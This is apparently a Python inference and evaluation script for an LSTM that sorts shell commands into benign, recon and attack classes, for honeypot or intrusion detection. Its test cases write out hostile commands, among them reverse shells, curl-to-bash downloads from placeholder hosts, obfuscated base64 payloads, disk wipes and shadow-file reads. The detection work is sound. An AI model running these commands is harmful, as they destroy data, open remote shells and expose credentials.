import torch
import torch.nn as nn
import pickle
import numpy as np
import pandas as pd
import re
import os
from collections import Counter, defaultdict

# Multiple model architectures to try
class SimpleLSTMClassifier(nn.Module):
    """Simple LSTM model - matches the saved checkpoint dimensions"""
    def __init__(self, vocab_size, embed_dim, hidden_dim, num_classes, dropout=0.3):
        super().__init__()
        
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
        self.dropout = nn.Dropout(dropout)
        
        # Single layer LSTM, not bidirectional
        self.lstm = nn.LSTM(embed_dim, hidden_dim, batch_first=True, dropout=dropout)
        
        # Simple classification layers
        self.fc1 = nn.Linear(hidden_dim, hidden_dim // 2)  # 32 -> 16
        self.fc2 = nn.Linear(hidden_dim // 2, hidden_dim // 8)  # 16 -> 4
        self.fc3 = nn.Linear(hidden_dim // 8, num_classes)  # 4 -> num_classes
        
        self.relu = nn.ReLU()
        self.dropout2 = nn.Dropout(dropout)
        
    def forward(self, x):
        embedded = self.embedding(x)
        embedded = self.dropout(embedded)
        
        lstm_out, (hidden, _) = self.lstm(embedded)
        
        # Use last hidden state
        output = hidden[-1]  # Take last layer's hidden state
        
        output = self.fc1(output)
        output = self.relu(output)
        output = self.dropout2(output)
        
        output = self.fc2(output)
        output = self.relu(output)
        output = self.dropout2(output)
        
        output = self.fc3(output)
        
        return output

class CleanLSTMClassifier(nn.Module):
    """Complex LSTM model with attention"""
    def __init__(self, vocab_size, embed_dim, hidden_dim, num_classes, dropout=0.4):
        super().__init__()
        
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
        self.embed_dropout = nn.Dropout(dropout * 0.5)
        
        self.lstm = nn.LSTM(embed_dim, hidden_dim, batch_first=True, 
                           bidirectional=True, num_layers=2, dropout=dropout)
        
        self.lstm_dropout = nn.Dropout(dropout)
        
        # Attention mechanism
        hidden_size = hidden_dim * 2  # bidirectional
        self.attention = nn.Sequential(
            nn.Linear(hidden_size, hidden_size // 2),
            nn.Tanh(),
            nn.Linear(hidden_size // 2, 1),
            nn.Softmax(dim=1)
        )
        
        # Classification layers
        self.fc1 = nn.Linear(hidden_size, hidden_size // 2)
        self.bn1 = nn.BatchNorm1d(hidden_size // 2)
        self.relu = nn.ReLU()
        self.dropout1 = nn.Dropout(dropout)
        
        self.fc2 = nn.Linear(hidden_size // 2, hidden_size // 4)
        self.bn2 = nn.BatchNorm1d(hidden_size // 4)
        self.dropout2 = nn.Dropout(dropout)
        
        self.fc3 = nn.Linear(hidden_size // 4, num_classes)
        
        self._init_weights()
        
    def _init_weights(self):
        for name, param in self.named_parameters():
            if 'weight' in name and param.dim() > 1:
                nn.init.xavier_uniform_(param)
            elif 'bias' in name:
                nn.init.constant_(param, 0)
        
    def forward(self, x):
        # Embedding layer
        embedded = self.embedding(x)
        embedded = self.embed_dropout(embedded)
        
        # LSTM layer
        lstm_out, (hidden, cell) = self.lstm(embedded)
        
        # Create mask for padding tokens
        mask = (x != 0).float().unsqueeze(-1)
        lstm_out_masked = lstm_out * mask
        
        # Attention mechanism
        attention_weights = self.attention(lstm_out_masked) * mask
        attention_weights = attention_weights / (attention_weights.sum(dim=1, keepdim=True) + 1e-8)
        
        # Apply attention
        attended = (lstm_out_masked * attention_weights).sum(dim=1)
        
        # Classification layers
        output = self.lstm_dropout(attended)
        
        output = self.fc1(output)
        output = self.bn1(output)
        output = self.relu(output)
        output = self.dropout1(output)
        
        output = self.fc2(output)
        output = self.bn2(output)
        output = self.relu(output)
        output = self.dropout2(output)
        
        output = self.fc3(output)
        
        return output

def detect_model_architecture(state_dict):
    """Detect which model architecture to use based on saved state dict"""
    keys = set(state_dict.keys())
    
    # Check for complex model features
    has_bidirectional = any('_reverse' in key for key in keys)
    has_attention = any('attention' in key for key in keys)
    has_batch_norm = any('bn1' in key or 'bn2' in key for key in keys)
    
    # Check FC layer dimensions to determine architecture
    fc1_weight_shape = state_dict.get('fc1.weight', torch.tensor([[]])).shape
    
    if fc1_weight_shape == torch.Size([16, 32]):
        return "simple"
    elif has_attention and has_batch_norm:
        return "complex"
    else:
        return "simple"

class InferenceEngine:
    def __init__(self, model_dir, verbose=True):
        """Initialize inference engine with model directory"""
        self.model_dir = model_dir
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        self.verbose = verbose
        
        if verbose:
            print(f"Using device: {self.device}")
        
        # Load all components
        self._load_vocab()
        self._load_label_encoder()
        self._load_model()
        
    def _load_vocab(self):
        """Load vocabulary"""
        vocab_path = os.path.join(self.model_dir, "preprocessed_data_ultra_clean_vocab.pkl")
        try:
            with open(vocab_path, 'rb') as f:
                self.vocab = pickle.load(f)
            if self.verbose:
                print(f"✅ Loaded vocabulary with {len(self.vocab)} tokens")
        except FileNotFoundError:
            raise FileNotFoundError(f"Vocabulary file not found: {vocab_path}")
    
    def _load_label_encoder(self):
        """Load label encoder"""
        encoder_path = os.path.join(self.model_dir, "preprocessed_data_ultra_clean_label_encoder.pkl")
        try:
            with open(encoder_path, 'rb') as f:
                self.label_encoder = pickle.load(f)
            if self.verbose:
                print(f"✅ Loaded label encoder with classes: {list(self.label_encoder.classes_)}")
        except FileNotFoundError:
            raise FileNotFoundError(f"Label encoder file not found: {encoder_path}")
    
    def _load_model(self):
        """Load trained model with automatic architecture detection"""
        # Try common model file names
        model_files = [
            "honeyai_lstm_realistic.pt",
            "best_model.pt", 
            "model.pt",
            "trained_model.pt"
        ]
        
        model_path = None
        for filename in model_files:
            potential_path = os.path.join(self.model_dir, filename)
            if os.path.exists(potential_path):
                model_path = potential_path
                break
        
        if model_path is None:
            raise FileNotFoundError(f"Model file not found. Tried: {model_files}")
        
        try:
            # Handle PyTorch 2.6+ security features
            try:
                import torch.serialization
                with torch.serialization.safe_globals(['numpy._core.multiarray.scalar', 'numpy.core.multiarray.scalar']):
                    checkpoint = torch.load(model_path, map_location=self.device, weights_only=True)
            except Exception:
                checkpoint = torch.load(model_path, map_location=self.device, weights_only=False)
            
            if self.verbose:
                print(f"✅ Loading model from: {model_path}")
            
            # Extract model parameters and state dict
            if isinstance(checkpoint, dict) and 'model_state_dict' in checkpoint:
                state_dict = checkpoint['model_state_dict']
                self.vocab_size = checkpoint.get('vocab_size', len(self.vocab))
                self.embed_dim = checkpoint.get('embed_dim', 128)
                self.hidden_dim = checkpoint.get('hidden_dim', 32)
                self.num_classes = checkpoint.get('num_classes', len(self.label_encoder.classes_))
                self.dropout = checkpoint.get('dropout', 0.3)
                    
            elif isinstance(checkpoint, dict):
                state_dict = checkpoint
                self.vocab_size = len(self.vocab)
                self.num_classes = len(self.label_encoder.classes_)
                
                if 'embedding.weight' in state_dict:
                    self.vocab_size, self.embed_dim = state_dict['embedding.weight'].shape
                else:
                    self.embed_dim = 64
                
                if 'lstm.weight_ih_l0' in state_dict:
                    lstm_input_size = state_dict['lstm.weight_ih_l0'].shape[0] // 4
                    self.hidden_dim = lstm_input_size
                elif 'fc1.weight' in state_dict:
                    self.hidden_dim = state_dict['fc1.weight'].shape[1]
                else:
                    self.hidden_dim = 32
                    
                self.dropout = 0.3
            else:
                raise ValueError("Checkpoint format not recognized")
            
            # Detect which model architecture to use
            arch_type = detect_model_architecture(state_dict)
            
            # Initialize appropriate model
            if arch_type == "simple":
                self.model = SimpleLSTMClassifier(
                    self.vocab_size, self.embed_dim, self.hidden_dim, 
                    self.num_classes, self.dropout
                )
            else:
                self.model = CleanLSTMClassifier(
                    self.vocab_size, self.embed_dim, self.hidden_dim, 
                    self.num_classes, self.dropout
                )
            
            # Load state dict
            try:
                self.model.load_state_dict(state_dict, strict=True)
            except Exception:
                missing_keys, unexpected_keys = self.model.load_state_dict(state_dict, strict=False)
                if len(missing_keys) > len(self.model.state_dict()) * 0.5:
                    raise RuntimeError("Too many missing keys - model architecture mismatch")
            
            self.model.to(self.device)
            self.model.eval()
            
            if self.verbose:
                print("✅ Model loaded and ready for inference")
            
        except Exception as e:
            raise RuntimeError(f"Error loading model: {e}")
    
    def ultra_aggressive_clean(self, text):
        """EXACT same cleaning function from preprocessing"""
        if pd.isna(text):
            return ""
        
        text = str(text).lower()
        
        # Remove ALL prompts
        prompts_to_remove = [
            r'^[\w\-\@\.]+[:\$#%>]+\s*',
            r'\[[\w\s/\-]+\][\$#%>]',
            r'[\w\-\@\.]+@[\w\-\.]+[:\~]*[\$#%>]+',
            r'root@[\w\-]+:[\w/~]*[#\$>]+',
            r'user@[\w\-]+:[\w/~]*[\$>]+',
            r'admin@[\w\-]+:[\w/~]*[\$>]+',
            r'dev@[\w\-]+:?[\w/~]*[\$>]*',
            r'\w+@\w+[\$#%>:~]+',
            r'^\s*[\$#%>]+\s*',
            r'[\$#%>]+\s*$',
        ]
        
        for pattern in prompts_to_remove:
            text = re.sub(pattern, '', text, flags=re.MULTILINE)
        
        # Remove command output/feedback
        output_patterns = [
            r';\s*sleep\s+\d+',
            r'\|\|\s*echo\s+[\'\"]*[\w\s]+[\'\"]*',
            r'&&\s*echo\s+[\'\"]*[\w\s]+[\'\"]*',
            r'echo\s+[\'\"]*[\w\s\[\]]+[\'\"]*',
            r'#\s*[\w\s]+',
            r'>\s*/dev/null\s*2>&1',
            r'2>/dev/null',
            r'\|\s*tee\s+[\w/\.]+',
            r'\s*\|\s*grep\s+[\w\-]+',
            r'\s*\|\s*head\s*(\-\d+)?',
            r'\s*\|\s*tail\s*(\-\d+)?',
            r'\s*\|\s*wc\s*(\-[lwc])?',
            r'\s*\|\s*sort',
            r'\s*\|\s*uniq',
        ]
        
        for pattern in output_patterns:
            text = re.sub(pattern, '', text, flags=re.IGNORECASE)
        
        # Remove timestamps and identifiers
        text = re.sub(r'\d{2}:\d{2}:\d{2}', '', text)
        text = re.sub(r'\d{4}-\d{2}-\d{2}', '', text)
        text = re.sub(r'pid\s*:\s*\d+', '', text)
        
        # Remove class-specific artifacts
        class_artifacts = [
            r'\bzhzh\b', r'\bach\b', r'\bexploit\b', r'\bstep\b',
            r'\bdone\b', r'\bokay\b', r'\bfail\b', r'\berror\b',
            r'\bsuccess\b', r'\bcomplete\b', r'\bfinished\b',
            r'\b(start|end|begin|finish)\b',
            r'\b(attack|recon|scan|probe)\b',
            r'\b(malicious|suspicious|evil|bad)\b',
            r'\b(hack|hacker|hacking|exploit|payload)\b',
        ]
        
        for artifact in class_artifacts:
            text = re.sub(artifact, '', text, flags=re.IGNORECASE)
        
        # Normalize file paths
        text = re.sub(r'/tmp/[\w\-\.]+', '/tmp/file', text)
        text = re.sub(r'/home/[\w\-]+', '/home/user', text)
        text = re.sub(r'/var/[\w/]+', '/var/path', text)
        text = re.sub(r'/etc/[\w\-\.]+', '/etc/file', text)
        
        # Normalize IPs and ports
        text = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', 'IP', text)
        text = re.sub(r':\d{1,5}\b', ':PORT', text)
        
        # Remove URLs
        text = re.sub(r'https?://[\w\-\./]+', 'URL', text)
        
        # Normalize variables
        text = re.sub(r'\$\{?\w+\}?', 'VAR', text)
        
        # Clean up whitespace
        text = re.sub(r'[;|&]+', ' ', text)
        text = re.sub(r'\s+', ' ', text)
        text = re.sub(r'[^\w\s\-\./]', ' ', text)
        
        return text.strip()
    
    def extract_core_commands(self, text):
        """Extract core command words only"""
        if not text:
            return ""
        
        tokens = text.split()
        commands = []
        
        for token in tokens:
            # Skip obvious arguments
            if any(pattern in token for pattern in [
                'IP', 'PORT', 'URL', 'VAR', '/tmp/', '/home/', '/etc/', '/var/',
                '.txt', '.py', '.sh', '.log', '.conf'
            ]):
                continue
            
            # Skip flags and options
            if token.startswith('-') or token.startswith('/'):
                continue
                
            # Skip numbers
            if token.isdigit():
                continue
                
            # Keep command-like tokens
            if re.match(r'^[a-z][a-z0-9]*$', token) and len(token) > 1:
                commands.append(token)
        
        return ' '.join(commands[:3])
    
    def minimal_tokenize(self, text):
        """Minimal tokenization - only core command words"""
        if not text:
            return []
        
        tokens = text.split()
        command_tokens = []
        
        for token in tokens:
            if token.isalpha() and 2 <= len(token) <= 15:
                command_tokens.append(token)
        
        return command_tokens[:5]
    
    def preprocess_input(self, text, max_len=5):
        """Complete preprocessing pipeline"""
        # Step 1: Ultra aggressive cleaning
        cleaned = self.ultra_aggressive_clean(text)
        
        # Step 2: Extract core commands
        core_commands = self.extract_core_commands(cleaned)
        
        # Step 3: Tokenize
        tokens = self.minimal_tokenize(core_commands)
        
        # Step 4: Convert to IDs
        token_ids = []
        for token in tokens:
            if token in self.vocab:
                token_ids.append(self.vocab[token])
            else:
                token_ids.append(self.vocab.get('<UNK>', 1))
        
        # Limit sequence length
        token_ids = token_ids[:max_len]
        
        # Pad to max length
        if len(token_ids) < max_len:
            token_ids += [0] * (max_len - len(token_ids))
        
        return torch.tensor(token_ids, dtype=torch.long).unsqueeze(0)
    
    def predict(self, text, show_probs=False):
        """Make prediction on input text"""
        # Preprocess
        x = self.preprocess_input(text).to(self.device)
        
        # Run inference
        with torch.no_grad():
            logits = self.model(x)
            probs = torch.softmax(logits, dim=1)
            pred_idx = torch.argmax(probs, dim=1).item()
            confidence = probs[0][pred_idx].item()
            
            # Get predicted label
            predicted_label = self.label_encoder.inverse_transform([pred_idx])[0]
            
            if show_probs:
                print(f"\nPrediction: {predicted_label} (confidence: {confidence:.3f})")
                print("All probabilities:")
                for i, (class_name, prob) in enumerate(zip(self.label_encoder.classes_, probs.cpu().numpy().flatten())):
                    marker = "→" if i == pred_idx else " "
                    print(f"  {marker} {class_name:<12}: {prob:.3f}")
        
        return predicted_label, confidence

def test_tty_content():
    """Simple test interface for TTY content"""
    model_dir = r"C:\Users\Faster\Downloads\Autonomous"
    
    # Put your TTY content here for testing
    tty_content = """
    user@server:~$ ls -la
    total 24
    drwxr-xr-x  3 user user 4096 Jan 15 10:30 .
    drwxr-xr-x 10 root root 4096 Jan 15 09:15 ..
    -rw-r--r--  1 user user  220 Jan 15 09:15 .bash_logout
    -rw-r--r--  1 user user 3771 Jan 15 09:15 .bashrc
    drwx------  2 user user 4096 Jan 15 10:30 .ssh
    user@server:~$ cd /tmp
    user@server:/tmp$ wget http://example.com/script.sh
    --2024-01-15 10:31:22--  http://example.com/script.sh
    Resolving example.com... 192.168.1.100
    Connecting to 192.168.1.100:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1024 (1.0K)
    Saving to: 'script.sh'
    user@server:/tmp$ chmod +x script.sh
    user@server:/tmp$ ./script.sh
    """
    
    try:
        # Load model
        engine = InferenceEngine(model_dir, verbose=True)
        
        print("\n" + "="*60)
        print("TESTING TTY CONTENT")
        print("="*60)
        
        # Split into individual commands
        lines = tty_content.strip().split('\n')
        commands = []
        
        for line in lines:
            line = line.strip()
            if line and not line.startswith('total') and not line.startswith('drwx') and not line.startswith('-rw'):
                if '$' in line:
                    # Extract command after $
                    cmd_part = line.split('$', 1)
                    if len(cmd_part) > 1:
                        commands.append(cmd_part[1].strip())
                elif line and not line.startswith('--') and not line.startswith('Resolving') and not line.startswith('Connecting') and not line.startswith('HTTP') and not line.startswith('Length') and not line.startswith('Saving'):
                    commands.append(line)
        
        # Test each command
        for i, cmd in enumerate(commands, 1):
            if cmd:
                print(f"\n{i}. Command: {cmd}")
                pred, conf = engine.predict(cmd, show_probs=False)
                print(f"   Result: {pred} ({conf:.3f})")
    
    except Exception as e:
        print(f"❌ Error: {e}")

def evaluate_accuracy():
    """Evaluate model accuracy on manually labeled test data with label mapping"""
    model_dir = r"C:\Users\Faster\Downloads\Autonomous"
    
    # Test cases with original labels
    test_cases = [
        # === BENIGN COMMANDS ===
        ("ls -la", "benign"),
        ("cd /home/user", "benign"),  
        ("echo hello world", "benign"),
        ("python script.py", "benign"),
        ("git status", "benign"),
        ("cat file.txt", "benign"),
        ("mkdir new_folder", "benign"),
        ("cp file1.txt file2.txt", "benign"),
        ("tar -xzf archive.tar.gz", "benign"),
        ("ps aux", "benign"),
        
        # === RECON COMMANDS ===
        ("nmap -sS 192.168.1.0/24", "recon"),
        ("netstat -tulpn", "recon"),
        ("whoami", "recon"),
        ("id", "recon"), 
        ("cat /etc/passwd", "recon"),
        ("find / -name '*.conf' 2>/dev/null", "recon"),
        ("ss -tuln", "recon"),
        ("ifconfig", "recon"),
        ("uname -a", "recon"),
        ("lsof -i", "recon"),
        
        # === ATTACK COMMANDS (map these to attack_low or attack_high as needed) ===
        # Replace "attack" with "attack_low" or "attack_high" as the model supports
        ("ssh root@192.168.1.100", "attack_low"),
        ("wget http://malicious.com/backdoor.sh", "attack_low"),
        ("nc -e /bin/sh 192.168.1.100 4444", "attack_high"),
        ("python -c \"import socket;exec('malicious code')\"", "attack_low"),
        ("curl http://evil.com/payload | bash", "attack_low"),
        ("chmod +x /tmp/backdoor && /tmp/backdoor", "attack_low"),
        ("echo 'evil' > /etc/crontab", "attack_low"),
        ("iptables -F", "attack_high"),
        ("rm -rf / --no-preserve-root", "attack_high"),
        ("dd if=/dev/urandom of=/dev/sda", "attack_high"),
        
        # === NEW TEST CASES FROM USER ===
        # Multi-command recon sequences
        ("whoami; ls -la; uname$IFS-a; id; cat /etc/passwd | base64; exit", "recon"),
        ("id; ps aux | grep -v grep | grep sshd; iptables -L > /dev/null 2>&1; exit", "recon"),
        ("cat /etc/shadow 2>/dev/null; whoami; echo ${PWD}; touch $(echo /tmp/.$(date +%s)); exit", "recon"),
        ("ping -c2 8.8.8.8; traceroute 10.10.10.10 || true; cat /var/log/auth.log | tail -n 20; exit", "recon"),
        ("cd /home/user; cat .bash_history | grep -i curl; lsof -i -n | grep :22 || true; exit", "recon"),
        ("(whoami && df -h) | tee usage.log; exit", "recon"),
        ("nmap -Pn $(echo -e '192.168.1.1'); ip a | grep inet; exit", "recon"),
        ("dig $(hostname) +short @1.1.1.1; arp -a | grep -v incomplete; exit", "recon"),
        ("for i in $(seq 1 10); do ping -c1 192.168.0.$i; done | grep ttl; exit", "recon"),
        ("curl -s ifconfig.me | xargs -I{} whois {}; exit", "recon"),
        ("echo $'\\x6e\\x65\\x74\\x73\\x74\\x61\\x74' | bash; exit", "recon"),
        ("eval $(echo 'd2hvYW1pCg==' | base64 -d); ps -ef | grep ssh; exit", "recon"),
        
        # Benign operations
        ("cd ~/docs; ls; cat ./summary.txt | tee log.txt; echo \"done\"", "benign"),
        ("curl -s https://example.com -o /tmp/x.html; less /tmp/x.html; exit", "benign"),
        ("git config --global user.name \"anon\"; echo $(date); exit", "benign"),
        ("PYTHONIOENCODING=utf-8 python3 -m http.server 8080 & disown; exit", "benign"),
        
        # Low-severity attacks (malware download/execution)
        ("nmap -sS 10.0.0.0/24; wget hxxp://malicious[.]com/m.sh -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x; exit", "attack_low"),
        ("cd /tmp; curl -fsSL http://bad.site/`echo sc`.sh > s.sh; bash s.sh; rm -f s.sh; exit", "attack_low"),
        ("wget http://evil.com/.bd -q -O- | bash; echo \"x\" > /dev/null; exit", "attack_low"),
        ("cd /tmp; wget hxxp://evil[.]xyz/a.sh -O - | bash; exit", "attack_low"),
        ("curl http://[0xc0a80001]/payload.sh | sh; exit", "attack_low"),
        ("echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh; exit", "attack_low"),
        ("cat /etc/shadow 2>/dev/null | base64 > /tmp/.x; exit", "attack_low"),
        ("echo \"$(printf 'Y3VybCAtcyBodHRwOi8vYmFkLmNvbS9yLnNoIHwgYmFzaAo=' | base64 -d)\" | sh; exit", "attack_low"),
        ("IFS=$'\\n';$(echo curl -s hxxp://mal.site | tr -d ' ' | bash); exit", "attack_low"),
        
        # High-severity attacks (reverse shells, system damage)
        ("bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 <&1'; exit", "attack_high"),
        ("eval \"$(echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0OyBzPXNvY2tldC5zb2NrZXQoKTsgcy5jb25uZWN0KCgiYXR0YWNrZXIuY29tIiw5OTk5KSk=' | base64 -d)\"; exit", "attack_high"),
        ("bash -c 'bash -i >& /dev/tcp/10.0.0.99/9001 0>&1' || true; exit", "attack_high"),
        ("(dd if=/dev/zero of=/dev/sda bs=1M count=1) > /dev/null 2>&1 & exit", "attack_high"),
        ("curl http://evil.com/drop.sh | tee >(bash) >/dev/null; chmod +s /bin/bash; exit", "attack_high"),
    ]
    
    def map_pred_label(label):
        """Map model output labels to general classes"""
        if label in ["attack_low", "attack_high"]:
            return "attack"
        return label
    
    try:
        print("Loading model...")
        engine = InferenceEngine(model_dir, verbose=False)
        
        print(f"\n{'='*100}")
        print(f"ACCURACY EVALUATION ON {len(test_cases)} TEST CASES")
        print(f"{'='*100}")
        
        correct = 0
        total = 0
        results_by_class = {}
        
        print(f"\n{'Command':<60} {'True':<12} {'Pred':<12} {'Conf':<6} {'✓'}")
        print("-" * 100)
        
        for command, true_label in test_cases:
            pred_label, confidence = engine.predict(command, show_probs=False)
            mapped_pred = map_pred_label(pred_label)
            
            is_correct = mapped_pred == true_label
            if is_correct:
                correct += 1
                status = "✓"
            else:
                status = "✗"
            
            total += 1
            
            # Track per-class results using true_label (your test labels)
            if true_label not in results_by_class:
                results_by_class[true_label] = {'total': 0, 'correct': 0}
            results_by_class[true_label]['total'] += 1
            if is_correct:
                results_by_class[true_label]['correct'] += 1
            
            cmd_short = command[:58] + ".." if len(command) > 60 else command
            print(f"{cmd_short:<60} {true_label:<12} {mapped_pred:<12} {confidence:.3f}  {status}")
        
        overall_accuracy = correct / total
        print(f"\n{'='*100}")
        print(f"OVERALL ACCURACY: {correct}/{total} = {overall_accuracy:.3f} ({overall_accuracy*100:.1f}%)")
        
        print(f"\nPER-CLASS ACCURACY:")
        for class_name, stats in results_by_class.items():
            class_acc = stats['correct'] / stats['total']
            print(f"  {class_name.upper():<12}: {stats['correct']}/{stats['total']} = {class_acc:.3f} ({class_acc*100:.1f}%)")
        
        # Confusion analysis (using mapped_pred to "attack")
        print(f"\nCONFUSION ANALYSIS:")
        confusion_matrix = {}
        for command, true_label in test_cases:
            pred_label, _ = engine.predict(command, show_probs=False)
            mapped_pred = map_pred_label(pred_label)
            key = f"{true_label} -> {mapped_pred}"
            confusion_matrix[key] = confusion_matrix.get(key, 0) + 1
        
        for confusion, count in sorted(confusion_matrix.items()):
            if confusion.split(" -> ")[0] != confusion.split(" -> ")[1]:
                print(f"  {confusion}: {count} cases")
        
        print(f"{'='*100}")
        
    except Exception as e:
        print(f"❌ Error: {e}")


def load_test_file(file_path):
    """Load test cases from a CSV file (command, true_label)"""
    model_dir = r"C:\Users\Faster\Downloads\Autonomous"
    
    try:
        print(f"Loading test data from: {file_path}")
        
        # Load test data
        df = pd.read_csv(file_path)
        
        # Expect columns: 'command' and 'label' 
        if 'command' not in df.columns or 'label' not in df.columns:
            raise ValueError("CSV must have 'command' and 'label' columns")
        
        test_cases = list(zip(df['command'].astype(str), df['label'].astype(str)))
        
        print(f"Loaded {len(test_cases)} test cases")
        print(f"Classes in test data: {sorted(set(df['label']))}")
        
        # Load model
        print("Loading model...")
        engine = InferenceEngine(model_dir, verbose=False)
        
        print(f"\n{'='*80}")
        print(f"ACCURACY EVALUATION ON {len(test_cases)} TEST CASES")
        print(f"{'='*80}")
        
        correct = 0
        total = 0
        results_by_class = {}
        
        for command, true_label in test_cases:
            pred_label, confidence = engine.predict(command, show_probs=False)
            
            is_correct = pred_label == true_label
            if is_correct:
                correct += 1
            
            total += 1
            
            # Track per-class results
            if true_label not in results_by_class:
                results_by_class[true_label] = {'total': 0, 'correct': 0}
            results_by_class[true_label]['total'] += 1
            if is_correct:
                results_by_class[true_label]['correct'] += 1
        
        # Results
        overall_accuracy = correct / total
        print(f"OVERALL ACCURACY: {correct}/{total} = {overall_accuracy:.3f} ({overall_accuracy*100:.1f}%)")
        
        print(f"\nPER-CLASS ACCURACY:")
        for class_name, stats in results_by_class.items():
            class_acc = stats['correct'] / stats['total']
            print(f"  {class_name.upper():<8}: {stats['correct']}/{stats['total']} = {class_acc:.3f} ({class_acc*100:.1f}%)")
        
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    import sys
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == '--accuracy' or sys.argv[1] == '-a':
            evaluate_accuracy()
        elif sys.argv[1] == '--file' or sys.argv[1] == '-f':
            if len(sys.argv) > 2:
                load_test_file(sys.argv[2])
            else:
                print("Usage: python inference.py --file <test_file.csv>")
        elif sys.argv[1] == '--tty' or sys.argv[1] == '-t':
            test_tty_content()
        else:
            print("Usage:")
            print("  python inference.py --tty        # Test TTY content")
            print("  python inference.py --accuracy   # Test predefined cases")
            print("  python inference.py --file test.csv # Test from CSV file")
    else:
        # Default: test TTY content
        test_tty_content()

if __name__ == "__main__":
    evaluate_accuracy()
